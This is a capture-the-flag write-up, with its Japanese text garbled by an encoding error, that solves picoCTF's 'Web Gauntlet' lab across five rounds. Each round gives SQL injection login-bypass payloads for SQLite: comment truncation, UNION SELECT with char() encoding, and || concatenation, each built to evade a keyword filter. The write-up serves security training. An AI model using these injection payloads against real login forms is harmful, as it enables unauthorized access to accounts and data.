#### 2021/01/09 �쐬

# [Web] Web Gauntlet - 200 points

## Description:
Can you beat the filters? Login as admin  
http://jupiter.challenges.picoctf.org:19593/  
http://jupiter.challenges.picoctf.org:19593/filter.php  

## Hints:
- You are not allowed to login with valid credentials.  
- Write down the injections you use in case you lose your progress.  
- For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.  
- sqlite  
- If your cookie keeps getting reset, try using a private browser window  

## Solution:
### Round 1/5
![round1.png](images/round1.png)
filter.php��```Round1: or```�ƋL�ڂ���Ă���AOR���g���Ȃ��B  
�V���O���N�H�[�g�ƃn�C�t�����g�p����username�ȍ~�̓��͂𖳌���(�R�����g�A�E�g)����B  
usename: ```admin'--```  
password: ```�C�ӂ̕���(���ł�����)```  
����͂���SIGN IN����B

### Round 2/5
filter.php�������[�h����ƁARound1�ŃT�C���C���ł���Cookie���ǂݍ��܂�A```Round2: or and like = --```�ƕ\�������B  
OR���ƃn�C�t���ɂ��R�����g�A�E�g���g�p�ł��Ȃ��悤�Ȃ̂ŁA```/**/```�ŃR�����g�A�E�g����B  
username: ```admin'/*```  
password: ```�C�ӂ̕���```  

### Round 3/5
filter.php��```Round3: or and = like > < --```�ƕ\�������B  
```/**/```�ŃR�����g�A�E�g���邱�Ƃ͉\�Ȃ̂�Round2�Ɠ��l�ɃT�C���C������B  
username: ```admin'/*```  
password: ```�C�ӂ̕���```  

### Round 4/5
filter.php��```Round4: or and = like > < -- admin```�ƕ\�������B  
���x��```admin```�Ƃ��������񂪎g�p�ł��Ȃ�����asciii�ϊ����s���A�܂�SELECT����ǉ�����UNION��œ���������B  
username: ```'/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*```  
password: ```�C�ӂ̕���```  

���Ȃ݂ɗL����SQL�ł���Ζ��Ȃ��̂ŁA���L�ł��T�C���C�����͉̂\�B  
username: ```'/**/union/**/select*from/**/users/**/limit/**/1/*```  
password: ```�C�ӂ̕���```  

### Round 5/5
filter.php��```Round5: or and = like > < -- union admin```�ƋL�ڂ���Ă���ʂ�A���x��UNION�傪�g���Ȃ��B  
���L�ɂ��T�C���C�������݂�B  
username: ```'||'adm'||'in'/*```  
password: ```�C�ӂ̕���```  


![round6.png](images/round6.png)

filter.php�������[�h����ƁA������FLAG���\�������B
